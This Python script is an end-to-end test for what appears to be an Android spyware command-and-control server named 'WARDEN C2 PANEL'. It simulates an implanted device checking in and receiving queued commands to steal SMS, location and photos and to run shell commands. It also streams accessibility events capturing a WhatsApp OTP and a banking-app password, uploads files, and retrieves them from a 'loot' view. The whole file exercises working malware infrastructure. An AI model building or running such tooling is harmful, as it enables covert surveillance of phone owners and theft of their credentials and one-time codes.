#!/usr/bin/env python3
"""End-to-end C2 test: fake agent session through every endpoint."""
import json, os, subprocess, sys, time, urllib.request

BASE = "http://127.0.0.1:8765"
HERE = os.path.dirname(os.path.abspath(__file__))

def req(method, path, data=None, headers=None, raw=False):
    r = urllib.request.Request(BASE + path, method=method, data=data, headers=headers or {})
    with urllib.request.urlopen(r, timeout=10) as resp:
        b = resp.read()
        return b if raw else json.loads(b.decode())

fails = []
def check(name, cond, extra=""):
    print(("PASS" if cond else "FAIL"), "-", name, extra)
    if not cond: fails.append(name)

# 1. checkin
d = json.dumps({"device_id": "testdev123", "model": "Pixel 8", "brand": "google",
                "android": "14", "sdk": 34, "phone": "+628123456789"}).encode()
r = req("POST", "/api/checkin", d, {"Content-Type": "application/json"})
check("checkin returns agent_id", "agent_id" in r, r.get("agent_id", ""))
aid = r["agent_id"]

# 2. queue commands
for cmd, args in [("sms", ""), ("location", ""), ("shell", "id"), ("photo", "front")]:
    r = req("POST", "/api/queue", json.dumps({"agent_id": aid, "cmd": cmd, "args": args}).encode(),
            {"Content-Type": "application/json"})
    check(f"queue {cmd}", "id" in r)

# 3. poll commands
cmds = req("GET", "/api/commands/" + aid)
check("poll returns 4 commands", len(cmds) == 4, f"got {len(cmds)}")
check("poll marks sent (2nd poll empty)", len(req("GET", "/api/commands/" + aid)) == 0)

# 4. send results
for c in cmds:
    req("POST", "/api/result", json.dumps({"agent_id": aid, "cmd_id": c["id"],
        "output": f"fake output for {c['cmd']}"}).encode(), {"Content-Type": "application/json"})
check("results accepted", True)

# 5. accessibility event stream
req("POST", "/api/event", json.dumps({"agent_id": aid, "type": "notification",
    "pkg": "com.whatsapp", "text": "OTP: 448291", "time": int(time.time())}).encode(),
    {"Content-Type": "application/json"})
req("POST", "/api/event", json.dumps({"agent_id": aid, "type": "text",
    "pkg": "com.bank.app", "text": "password field: hunter2", "time": int(time.time())}).encode(),
    {"Content-Type": "application/json"})
check("events accepted", True)

# 6. file upload (multipart, same wire format as the agent)
boundary = "----warden-test"
body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
        f"filename=\"photo.jpg\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode()
body += os.urandom(4096) + f"\r\n--{boundary}--\r\n".encode()
r = req("POST", "/api/upload?agent_id=" + aid + "&name=photo.jpg", body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}"})
check("file upload", r.get("ok") and r.get("size") == 4096, str(r))

# 7. loot view
loot = req("GET", "/api/loot/" + aid)
check("loot: 4 commands done", all(c["status"] == "done" for c in loot["commands"]))
check("loot: 2 events", len(loot["events"]) == 2)
check("loot: 1 file", len(loot["files"]) == 1 and loot["files"][0]["size"] == 4096)
check("loot file downloadable", len(req("GET", "/loot/" + loot["files"][0]["path"], raw=True)) == 4096)

# 8. agents list + panel
agents = req("GET", "/api/agents")
check("agents list has our agent", any(a["id"] == aid for a in agents))
panel = req("GET", "/", raw=True).decode()
check("panel serves HTML", "WARDEN C2 PANEL" in panel and aid not in panel)

print()
if fails:
    print("FAILED:", fails); sys.exit(1)
print("ALL TESTS PASSED")
